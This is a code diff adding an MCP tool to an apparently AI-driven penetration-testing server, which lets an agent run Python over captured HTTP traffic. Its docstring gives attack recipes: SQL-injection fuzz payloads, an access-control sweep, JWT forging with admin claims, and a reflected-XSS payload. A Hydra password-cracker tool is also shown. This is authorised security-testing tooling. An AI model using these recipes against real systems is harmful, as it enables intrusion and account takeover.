@@ -650,6 +650,109 @@ def execute_code(code: str, language: str = "python", filename: str = "exploit")
 
 
 @mcp.tool()
+def proxy_brain(code: str, _redamon_ctx: str = "") -> str:
+    """
+    Write and run Python to HUNT and EXPLOIT over the captured HTTP corpus (the
+    "Burp history"). ONE tool replacing proxy_search/get/sitemap/params/grep/diff/
+    to_curl/query/replay/fuzz: call them as `redamon.*` functions and compose them
+    with loops, conditionals, math and crypto to build real exploit oracles that a
+    fixed tool vocabulary cannot express (blind-SQLi bisection, IDOR sweeps, JWT
+    forging, race conditions, multi-step chains).
+
+    RUNTIME
+    - Your code runs in the Kali sandbox with `redamon` pre-imported for you.
+    - Tenant scope is enforced server-side; you cannot read another project.
+    - Active calls (replay/batch/fuzz) are HOST-PINNED to the origin request,
+      egress-guarded, re-captured, and per-send phase-gated. You cannot retarget
+      them at a different host, and they are refused outside the exploitation phase.
+    - Print ONLY what you need — output is truncated. Distil many responses to a
+      few lines yourself; never dump raw bodies.
+
+    SDK (already imported as `redamon`)
+      READ (no traffic):  search(**f) get(id,part) sitemap() params() grep(pat,limit)
+                          diff(a,b) query(spec) to_curl(id)
+      DECODE (no traffic): decode(v) ; jwt(tok).forge(alg_none=True|secret=..|claims=..)
+      ACTIVE (live):       replay(id, mutate={...}) ; batch(id, mutations=[...]) ; fuzz(id, point, payloads)
+      RESULT:              finding(kind, txn_id, evidence, severity) ; emit(text) ; print(...)
+      mutate keys: method,path,query,param:{k:v},headers:{k:v},dropHeaders:[..],cookie,body
+                   (host/scheme/port are PINNED — cannot change).
+      search filters: host, method, status, status_class, tool, source, session, run,
+                      has_auth, reflected, only_5xx, q, body_q, limit.
+      search(...) -> list of rows with .id ; replay/fuzz -> Response with .status .length .body .headers
+
+    RECIPES
+      # Fuzz + oracle (blind SQLi / anomaly)
+      t = redamon.search(path="/api/invoice")[0]
+      for r in redamon.fuzz(t.id, "id", ["1002","999999","1001'","1001 OR 1=1"]):
+          print(r.payload, r.status, r.length, "SQLERR" if "SQL" in r.body else "")
+
+      # Access-control sweep (IDOR/BOLA)
+      for t in redamon.search(session="sess_alice"):
+          r = redamon.replay(t.id, mutate={"dropHeaders": ["Cookie"]})
+          if r.status == 200: redamon.finding("bola", t.id, evidence=r, severity="high")
+
+      # JWT forge
+      tok = redamon.jwt("eyJ...")
+      forged = tok.forge(secret="secret123", claims={"role": "admin"})
+      r = redamon.replay(id, mutate={"headers": {"Authorization": f"Bearer {forged}"}})
+
+      # Decode an opaque param
+      print(redamon.decode("dXNlcjoxMDAyOnJvbGU9dXNlcg=="))   # user:1002:role=user
+
+      # Reflected-XSS confirm
+      r = redamon.replay(id, mutate={"param": {"q": "rdmn<svg/onload=1>"}})
+      if "rdmn<svg/onload=1>" in r.body: redamon.finding("xss", id, evidence=r, severity="high")
+
+    Args:
+        code: the Python to run (multi-line, proper indentation, no escaping needed).
+
+    Returns:
+        Combined stdout + stderr of the run (truncated by the agent).
+    """
+    if not code or not code.strip():
+        return "[ERROR] No code provided to execute"
+
+    import uuid
+    # Unique per-invocation path: kali-sandbox is shared across sessions/tenants,
+    # so a fixed filename would let concurrent runs overwrite each other's code.
+    filepath = f"/tmp/pb_{uuid.uuid4().hex}.py"
+
+    write_cmd = f"cat << 'REDAMON_PB_EOF' > {filepath}\n{code}\nREDAMON_PB_EOF"
+    try:
+        w = subprocess.run(["bash", "-c", write_cmd], capture_output=True, text=True, timeout=10)
+        if w.returncode != 0:
+            return f"[ERROR] Failed to write code file: {w.stderr}"
+    except Exception as e:  # noqa: BLE001
+        return f"[ERROR] Failed to write code file: {str(e)}"
+
+    # Per-invocation env: the signed tenant/session tag is set ONLY on this child,
+    # never on the container/global env, so concurrent tenants never see each
+    # other's context. REDAMON_AGENT_URL + SCANNER_API_KEY are inherited.
+    child_env = dict(os.environ)
+    child_env["REDAMON_CTX"] = _redamon_ctx or ""
+
+    try:
+        result = subprocess.run(
+            ["python3", filepath], capture_output=True, text=True, timeout=180, env=child_env,
+        )
+        output = result.stdout
+        if result.stderr:
+            output += f"\n[STDERR]: {result.stderr}"
+        if result.returncode != 0 and not output.strip():
+            output = f"[ERROR] proxy_brain exited with code {result.returncode}"
+        return output if output.strip() else "[INFO] proxy_brain ran with no output"
+    except subprocess.TimeoutExpired:
+        return "[ERROR] proxy_brain timed out after 180 seconds."
+    except Exception as e:  # noqa: BLE001
+        return f"[ERROR] {str(e)}"
+    finally:
+        try:
+            os.remove(filepath)
+        except OSError:
+            pass
+
+
+@mcp.tool()
 def execute_hydra(args: str) -> str:
     """
     Execute THC Hydra password cracker with any valid CLI arguments.
